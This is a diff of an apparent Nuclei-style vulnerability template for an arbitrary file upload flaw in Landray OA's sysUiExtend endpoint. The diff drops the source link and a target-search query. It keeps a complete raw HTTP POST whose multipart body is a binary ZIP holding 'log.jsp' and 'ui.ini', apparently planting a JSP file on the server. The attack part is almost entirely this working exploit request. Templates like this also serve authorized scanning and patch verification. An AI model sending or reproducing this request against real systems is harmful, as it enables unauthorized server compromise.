@@ -3,14 +3,8 @@ info:
   name: 蓝凌OAEKPsysUiExtend存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4b5e3d00d0a8c67c0dd5feb6b5e862f5
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 4b5e3d00d0a8c67c0dd5feb6b5e862f5
-    fofa: + hunter`app.name="Landray 蓝凌OA"`
 http:
 - raw:
   - "POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------174473422425067290282326981440\nContent-Length: 682\nOrigin: null\nConnection: close\nCookie: JSESSIONID=3481D31EA6897DA23B87A25B2E549F09\nUpgrade-Insecure-Requests: 1\n\n-----------------------------174473422425067290282326981440\nContent-Disposition: form-data; name=\"file\"; filename=\"output_base64Datazip.zip\"\nContent-Type: application/zip\n\nPK\x03\x04\x14\0\0\0\0\x9C\x03\x90W²¢g~_\0\0\0g\0\0\0\a\0\0\0log.jsp\nÈ1\x0E\x830\nFá«° Å\n,e\x06uì\\Á\t,ú\x8B\x1AYI\x1A\n\\\x1Fèð\x86÷õm\x937çR5¹¥\x10c|\\Q\x97p4\x8BìÂ\x9Aù¥\x86 ¥\x98Nâ\x9A\x13Ïð\x01boño¨ømXý¶\x11u7ø\x9F\x89\x88?¸\x0E\x81ºöy\x02PK\x03\x04\x14\0\0\0\0\x8AµEXå\x17ö<\n\0\0\0\n\0\0\0\x06\0\0\0ui.iniËL±5202áåÊKÌMµ-I-.áå*É(ÍM\x02³\x01PK\x01\x02\x14\0\x14\0\0\0\0\x9C\x03\x90W²¢g~_\0\0\0g\0\0\0\a\0\0\0\0\0\0\0\x01\0 \0\0\0\0\0\0\0log.jspPK\x01\x02\x14\0\x14\0\0\0\0\x8AµEXå\x17ö<\n\0\0\0\n\0\0\0\x06\0\0\0\0\0\0\0\x01\0 \0\0\0\x84\0\0\0ui.iniPK\x05\x06\0\0\0\0\x02\0\x02\0i\0\0\0Ä\0\0\0\0\0\n-----------------------------174473422425067290282326981440\nContent-Disposition: form-data; name=\"submit\"\n\nSubmit\n-----------------------------174473422425067290282326981440--"
